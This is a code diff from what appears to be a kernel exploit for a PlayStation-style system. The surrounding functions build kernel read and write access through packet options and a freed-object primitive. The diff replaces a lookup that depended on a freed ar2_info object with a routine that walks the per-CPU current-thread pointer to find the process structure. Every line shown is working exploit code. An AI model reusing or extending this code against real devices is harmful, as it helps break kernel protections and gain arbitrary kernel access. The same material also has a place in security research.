@@ -1100,6 +1100,19 @@ uint64_t kread64(ptr64_t addr)
     return *(uint64_t*)read_buf;
 }
 
+ptr64_t find_current_process()
+{
+    uint32_t cpuid = 7 - CPU_CORE;
+    ptr64_t pcpu = kread64(s2.kernel_base + K_CPUID_TO_PCPU + (cpuid * 8));
+    ptr64_t td = kread64(pcpu + PCPU_CURTHREAD);
+    ptr64_t tid = kread64(td + 0x88);
+    printf_debug("Current thread tid: %d\n", (uint32_t)tid);
+    ptr64_t proc = kread64(td + TD_PROC);
+    if ((uint32_t)kread64(proc + PROC_PID) != PS::getpid())
+        return 0;
+    return proc;
+}
+
 ptr64_t locate_pktopts(int32_t sd, ptr64_t ofiles)
 {
     ptr64_t file = kread64(ofiles + (sd * SIZEOF_OFILES));
@@ -1200,20 +1213,11 @@ int32_t make_kernel_arw()
 
     printf_debug("* Achieved restricted read!\n");
 
-    // Finding the current process structure
-    // `ar2_info` object should have its address at offset 8, assuming
-    // that it hasn't been overwritten after being freed.
-    ptr64_t proc = kread64(s2.req2->ar2_info + 8);
-    // Check if we got a valid proc address
-    if (proc >> 8*6 != 0xffff)
-    {
-        printf_debug("Invalid proc address!\n");
-        return -1;
-    }
-    if ((uint32_t)kread64(proc + PROC_PID) != PS::getpid())
-    {
-        printf_debug("Invalid proc address!\n");
-        return -1;
+    // Finding the current process object
+    s4.proc = find_current_process();
+    if (!s4.proc) {
+        printf_debug("Unable to get proc address!\n");
+        return (err = -1);
     }
     printf_debug("proc: 0x%08x%08x\n",
         (uint32_t)(s4.proc >> 32), (uint32_t)s4.proc);
